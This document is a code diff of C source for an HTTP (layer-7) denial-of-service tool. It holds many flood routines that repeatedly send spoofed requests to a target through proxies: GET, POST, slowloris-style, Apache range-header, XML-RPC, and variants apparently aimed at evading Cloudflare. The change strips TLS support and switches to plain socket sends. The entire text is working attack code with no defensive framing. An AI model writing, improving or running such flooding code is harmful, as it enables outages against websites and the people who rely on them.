@@ -2,34 +2,8 @@
 
 extern const char *rand_search_agent(void);
 
-int open_connection_l7(layer7_args_t *args, SSL **ssl_out) {
-    *ssl_out = NULL;
-    int s = open_connection_l4(args->host_ip, args->target.port, args->proxies, args->proxy_count);
-    if (s < 0) return -1;
-    if (strcasecmp(args->target.scheme, "https") == 0) {
-        SSL *ssl = SSL_new(args->ssl_ctx);
-        if (!ssl) { close(s); return -1; }
-        SSL_set_fd(ssl, s);
-        SSL_set_tlsext_host_name(ssl, args->target.host);
-        if (SSL_connect(ssl) <= 0) { SSL_free(ssl); close(s); return -1; }
-        *ssl_out = ssl;
-    }
-    return s;
-}
-
-static int ssl_tools_send(int sock, SSL *ssl, const uint8_t *data, int len) {
-    int sent;
-    if (ssl) sent = SSL_write(ssl, data, len);
-    else sent = send(sock, data, len, MSG_NOSIGNAL);
-    if (sent <= 0) return 0;
-    atomic_fetch_add(&BYTES_SEND, sent);
-    atomic_fetch_add(&REQUESTS_SENT, 1);
-    return 1;
-}
-
-static void ssl_safe_close(int sock, SSL *ssl) {
-    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
-    if (sock >= 0) close(sock);
+int open_connection_l7(layer7_args_t *args) {
+    return open_connection_l4(args->host_ip, args->target.port, args->proxies, args->proxy_count);
 }
 
 void generate_spoof_headers(char *buf, int buflen) {
@@ -76,21 +50,19 @@ void generate_l7_payload(layer7_args_t *args, const char *extra, char *buf, int 
 
 void flood_get(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_post(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char rdata[33]; rand_str(rdata, 32);
         char extra[256];
@@ -102,15 +74,14 @@ void flood_post(layer7_args_t *args) {
         char payload[8192];
         generate_l7_payload(args, extra, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_stress(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char rdata[513]; rand_str(rdata, 512);
         char extra[768];
@@ -122,15 +93,14 @@ void flood_stress(layer7_args_t *args) {
         char payload[8192];
         generate_l7_payload(args, extra, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_pps(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         const char *method_str = get_method_type_str(args->method);
         const char *http_ver = (rand() % 2) ? "1.0" : "1.1";
@@ -138,45 +108,42 @@ void flood_pps(layer7_args_t *args) {
         snprintf(payload, sizeof(payload), "%s %s HTTP/%s\r\nHost: %s\r\n\r\n",
                 method_str, args->target.raw_path_qs, http_ver, args->target.authority);
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_even(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         uint8_t recv_buf[1];
-        while (*args->running && ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) {
-            int r = ssl ? SSL_read(ssl, recv_buf, 1) : recv(s, recv_buf, 1, 0);
+        while (*args->running && tools_send(s, (uint8_t*)payload, strlen(payload))) {
+            int r = recv(s, recv_buf, 1, 0);
             if (r <= 0) break;
         }
-        ssl_safe_close(s, ssl);
+        safe_close(s);
     }
 }
 
 void flood_ovh(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         int rpc = args->rpc < 5 ? args->rpc : 5;
         for (int i = 0; i < rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_null(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         const char *method_str = get_method_type_str(args->method);
         const char *http_ver = (rand() % 2) ? "1.0" : "1.1";
@@ -191,15 +158,14 @@ void flood_null(layer7_args_t *args) {
             method_str, args->target.raw_path_qs, http_ver,
             args->target.authority, spoof);
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_cookie(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char rk[7]; rand_str(rk, 6);
         char rv[33]; rand_str(rv, 32);
@@ -211,15 +177,14 @@ void flood_cookie(layer7_args_t *args) {
         char payload[8192];
         generate_l7_payload(args, extra, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_apache(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char range[16384];
         int rpos = snprintf(range, sizeof(range), "Range: bytes=0-");
@@ -229,15 +194,14 @@ void flood_apache(layer7_args_t *args) {
         char payload[32768];
         generate_l7_payload(args, range, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_xmlrpc(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char r1[65]; rand_str(r1, 64);
         char r2[65]; rand_str(r2, 64);
@@ -254,15 +218,14 @@ void flood_xmlrpc(layer7_args_t *args) {
         char payload[8192];
         generate_l7_payload(args, extra, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_bot(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char p1[2048];
         snprintf(p1, sizeof(p1),
@@ -287,20 +250,19 @@ void flood_bot(layer7_args_t *args) {
             "If-None-Match: %s-%s\r\n"
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n",
             args->target.raw_authority, rand_search_agent(), r1, r2);
-        ssl_tools_send(s, ssl, (uint8_t*)p1, strlen(p1));
-        ssl_tools_send(s, ssl, (uint8_t*)p2, strlen(p2));
+        tools_send(s, (uint8_t*)p1, strlen(p1));
+        tools_send(s, (uint8_t*)p2, strlen(p2));
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_dyn(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char rnd[7]; rand_str(rnd, 6);
         const char *method_str = get_method_type_str(args->method);
@@ -325,96 +287,91 @@ void flood_dyn(layer7_args_t *args) {
             rnd, args->target.authority, ua, ref,
             args->target.human_repr, spoof);
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_slow(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload));
+            tools_send(s, (uint8_t*)payload, strlen(payload));
         uint8_t recv_buf[1];
-        while (*args->running && ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) {
-            int r = ssl ? SSL_read(ssl, recv_buf, 1) : recv(s, recv_buf, 1, 0);
+        while (*args->running && tools_send(s, (uint8_t*)payload, strlen(payload))) {
+            int r = recv(s, recv_buf, 1, 0);
             if (r <= 0) break;
             for (int i = 0; i < args->rpc; i++) {
                 int v = rand_int(1, 5000);
                 char keep[64];
                 int kl = snprintf(keep, sizeof(keep), "X-a: %d\r\n", v);
-                ssl_tools_send(s, ssl, (uint8_t*)keep, kl);
+                tools_send(s, (uint8_t*)keep, kl);
                 usleep((args->rpc * 1000000) / 15);
                 break;
             }
         }
-        ssl_safe_close(s, ssl);
+        safe_close(s);
     }
 }
 
 void flood_cfbuam(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
-        ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload));
+        tools_send(s, (uint8_t*)payload, strlen(payload));
         usleep(5010000);
         time_t ts = time(NULL);
         for (int i = 0; i < args->rpc && *args->running; i++) {
-            ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload));
+            tools_send(s, (uint8_t*)payload, strlen(payload));
             if (time(NULL) > ts + 120) break;
         }
-        ssl_safe_close(s, ssl);
+        safe_close(s);
     }
 }
 
 void flood_avb(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++) {
             int delay = args->rpc > 1000 ? 1000000 : (args->rpc * 1000);
             usleep(delay);
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
         }
-        ssl_safe_close(s, ssl);
+        safe_close(s);
     }
 }
 
 void flood_downloader(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char payload[8192];
         generate_l7_payload(args, NULL, payload, sizeof(payload));
         for (int i = 0; i < args->rpc && *args->running; i++) {
-            ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload));
+            tools_send(s, (uint8_t*)payload, strlen(payload));
             while (1) {
                 usleep(10000);
                 uint8_t buf[1];
-                int r = ssl ? SSL_read(ssl, buf, 1) : recv(s, buf, 1, 0);
+                int r = recv(s, buf, 1, 0);
                 if (r <= 0) break;
             }
         }
-        ssl_tools_send(s, ssl, (uint8_t*)"0", 1);
-        ssl_safe_close(s, ssl);
+        tools_send(s, (uint8_t*)"0", 1);
+        safe_close(s);
     }
 }
 
 void flood_rhex(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         int hexlen = (rand() % 3 == 0) ? 32 : (rand() % 2 == 0) ? 64 : 128;
         uint8_t hexbytes[128]; rand_bytes(hexbytes, hexlen);
@@ -446,15 +403,14 @@ void flood_rhex(layer7_args_t *args) {
             args->target.authority, hexstr,
             ua, ref, args->target.human_repr, spoof);
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
+        safe_close(s);
     }
 }
 
 void flood_stomp(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         char hexh[512];
         memset(hexh, 0, sizeof(hexh));
@@ -484,17 +440,16 @@ void flood_stomp(layer7_args_t *args) {
         char p2[16384];
         snprintf(p2, sizeof(p2), "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s",
             method_str, args->target.authority, hexh, ua, ref, args->target.human_repr, spoof, dep);
-        ssl_tools_send(s, ssl, (uint8_t*)p1, strlen(p1));
+        tools_send(s, (uint8_t*)p1, strlen(p1));
         for (int i = 0; i < args->rpc && *args->running; i++)
-            if (!ssl_tools_send(s, ssl, (uint8_t*)p2, strlen(p2))) break;
-        ssl_safe_close(s, ssl);
+            if (!tools_send(s, (uint8_t*)p2, strlen(p2))) break;
+        safe_close(s);
     }
 }
 
 void flood_gsb(layer7_args_t *args) {
     while (*args->running) {
-        SSL *ssl = NULL;
-        int s = open_connection_l7(args, &ssl);
+        int s = open_connection_l7(args);
         if (s < 0) continue;
         for (int i = 0; i < args->rpc && *args->running; i++) {
             char qs[7]; rand_str(qs, 6);
@@ -522,27 +477,16 @@ void flood_gsb(layer7_args_t *args) {
                 "Upgrade-Insecure-Requests: 1\r\n\r\n",
                 method_str, args->target.raw_path_qs, qs,
                 args->target.authority, ua, ref, args->target.human_repr, spoof);
-            if (!ssl_tools_send(s, ssl, (uint8_t*)payload, strlen(payload))) break;
+            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
         }
-        ssl_safe_close(s, ssl);
+        safe_close(s);
     }
 }
 
-void flood_bypass(layer7_args_t *args) {
-    flood_get(args);
-}
-
-void flood_cfb(layer7_args_t *args) {
-    flood_get(args);
-}
-
-void flood_dgb(layer7_args_t *args) {
-    flood_get(args);
-}
-
-void flood_tor(layer7_args_t *args) {
-    flood_get(args);
-}
+void flood_bypass(layer7_args_t *args) { flood_get(args); }
+void flood_cfb(layer7_args_t *args) { flood_get(args); }
+void flood_dgb(layer7_args_t *args) { flood_get(args); }
+void flood_tor(layer7_args_t *args) { flood_get(args); }
 
 void flood_killer(layer7_args_t *args) {
     while (*args->running) {
